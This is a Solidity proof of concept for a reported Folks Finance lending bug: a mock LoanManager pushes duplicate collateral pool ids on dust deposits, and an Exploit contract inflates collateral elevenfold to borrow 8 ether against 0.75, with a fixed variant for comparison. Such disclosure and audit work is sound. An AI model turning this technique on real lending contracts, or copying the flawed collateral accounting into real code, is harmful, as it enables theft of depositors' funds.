// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Folks Finance (Immunefi #33816, submitted 2024-07-30).
    A 1 wei deposit rounds to 0 fAmount while increaseCollateral still pushes
    the pool id. Ten dust deposits plus one real ether make colPools contain
    the same id 11 times. getLoanLiquidity prices that ether 11 times, so
    8 ether is borrowed against collateral that should support 0.75 ether.
*/

contract Token {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LoanManager {
    uint256 public constant INDEX = 2e18;
    uint256 public constant COLLATERAL_FACTOR = 0.75 ether;
    struct Col {
        uint256 balance;
    }
    struct UserLoan {
        uint8[] colPools;
        mapping(uint8 => Col) collaterals;
        uint256 borrowBalance;
    }
    struct LoanLiquidityParams {
        uint256 effectiveCollateralValue;
        uint256 effectiveBorrowValue;
    }

    Token public token;
    mapping(address => UserLoan) internal loans;
    uint256 public lastEffective;
    bool public countOnce;

    constructor(Token _token) {
        token = _token;
    }

    function colLength(address user) external view returns (uint256) {
        return loans[user].colPools.length;
    }

    function toFAmount(uint256 underlyingAmount) public pure returns (uint256) {
        return underlyingAmount * 1e18 / INDEX;
    }

    function increaseCollateral(UserLoan storage loan, uint8 poolId, uint256 fAmount) internal {
        if (loan.collaterals[poolId].balance == 0) {
            if (!(countOnce && loan.colPools.length != 0)) loan.colPools.push(poolId);
        }
        loan.collaterals[poolId].balance += fAmount;
    }

    function getLoanLiquidity(address user) public view returns (LoanLiquidityParams memory loanLiquidity) {
        UserLoan storage loan = loans[user];
        uint256 effectiveValue;
        uint256 poolsLength = loan.colPools.length;
        for (uint256 i = 0; i < poolsLength; i++) {
            uint8 poolId = loan.colPools[i];
            uint256 balance = loan.collaterals[poolId].balance * INDEX / 1e18;
            // @> VULN: every duplicate colPools entry adds the same collateral balance again
            effectiveValue += balance * COLLATERAL_FACTOR / 1e18;
        }
        loanLiquidity.effectiveCollateralValue = effectiveValue;
        loanLiquidity.effectiveBorrowValue = loan.borrowBalance;
    }

    function deposit(uint8 poolId, uint256 amount) external {
        uint256 fAmount = toFAmount(amount);
        token.transferFrom(msg.sender, address(this), amount);
        increaseCollateral(loans[msg.sender], poolId, fAmount);
    }

    function borrow(uint256 amount) external {
        LoanLiquidityParams memory loanLiquidity = getLoanLiquidity(msg.sender);
        require(loanLiquidity.effectiveCollateralValue >= loanLiquidity.effectiveBorrowValue + amount, "health");
        lastEffective = loanLiquidity.effectiveCollateralValue;
        loans[msg.sender].borrowBalance += amount;
        token.transfer(msg.sender, amount);
    }

    function enableCountOnce() external {
        countOnce = true;
    }
}

contract Exploit {
    Token public token;
    LoanManager public loans;
    uint256 public constant REAL = 1 ether;
    uint256 public constant BORROWED = 8 ether;
    uint256 public constant FAIR = 0.75 ether;

    constructor() {
        token = new Token();
        loans = new LoanManager(token);
        token.mint(address(loans), 10 ether);
        token.mint(address(this), REAL + 10);
    }

    function run() external {
        token.approve(address(loans), REAL + 10);
        for (uint256 i; i < 10; i++) {
            loans.deposit(1, 1);
        }
        require(loans.toFAmount(1) == 0, "dust");
        loans.deposit(1, REAL);
        require(loans.colLength(address(this)) == 11, "dups");
        loans.borrow(BORROWED);
        require(loans.lastEffective() == 11 * FAIR, "inflated");
        require(token.balanceOf(address(this)) == BORROWED, "took");
        require(FAIR < BORROWED, "over");
    }

    function runFixed() external {
        loans.enableCountOnce();
        token.approve(address(loans), REAL + 10);
        for (uint256 i; i < 10; i++) {
            loans.deposit(1, 1);
        }
        loans.deposit(1, REAL);
        require(loans.colLength(address(this)) == 1, "once");
        try loans.borrow(BORROWED) {
            revert("should revert");
        } catch {}
        loans.borrow(FAIR);
        require(token.balanceOf(address(this)) == FAIR, "fairBorrow");
        require(loans.lastEffective() == FAIR, "onceValue");
    }
}
